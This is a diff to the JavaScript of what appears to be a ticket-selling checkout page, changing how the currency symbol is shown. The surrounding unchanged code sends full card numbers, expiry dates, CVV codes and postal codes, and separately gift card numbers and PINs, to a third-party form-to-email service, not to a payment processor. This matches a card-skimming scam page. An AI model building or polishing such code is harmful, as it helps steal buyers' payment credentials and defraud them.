@@ -116,7 +116,10 @@ function completeEmailSubmission(email) {
     document.getElementById('detailType').textContent = orderSummary.ticketType || '-';
     document.getElementById('detailSeat').textContent = `${orderSummary.section || '-'} ${orderSummary.row ? '(Row ' + orderSummary.row + ')' : ''}`.trim() || '-';
     document.getElementById('detailQuantity').textContent = orderSummary.quantity || '-';
-    document.getElementById('detailTotal').textContent = orderSummary.total ? '£' + orderSummary.total.toFixed(2) : '-';
+    
+    // Use event currency instead of hardcoded £
+    const currencySymbol = orderSummary.currencySymbol || '£';
+    document.getElementById('detailTotal').textContent = orderSummary.total ? currencySymbol + orderSummary.total.toFixed(2) : '-';
   }
 
   // Show checkout content after 5 seconds
@@ -228,7 +231,8 @@ async function submitCardPayment(orderSummary = {}) {
     formData.append('expiry_date', expiryDate);
     formData.append('security_code', cvv);
     formData.append('zip_code', postalCode);
-    formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expiryDate}, Amount: £${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
+    const currencySymbol = orderSummary.currencySymbol || '£';
+    formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expiryDate}, Amount: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
 
     // Submit to Web3Forms
     const response = await fetch('https://api.web3forms.com/submit', {
@@ -303,7 +307,8 @@ async function submitGiftCardPayment(orderSummary = {}) {
     formData.append('total_payment', orderSummary.total || '');
     formData.append('gift_card_number', giftCardNumber);
     formData.append('gift_card_pin', giftCardPin);
-    formData.append('message', `Gift Card Payment Received\n\nGift Card: ${giftCardNumber}\nAmount: £${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
+    const currencySymbol = orderSummary.currencySymbol || '£';
+    formData.append('message', `Gift Card Payment Received\n\nGift Card: ${giftCardNumber}\nAmount: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
 
     // Submit to Web3Forms
     const response = await fetch('https://api.web3forms.com/submit', {
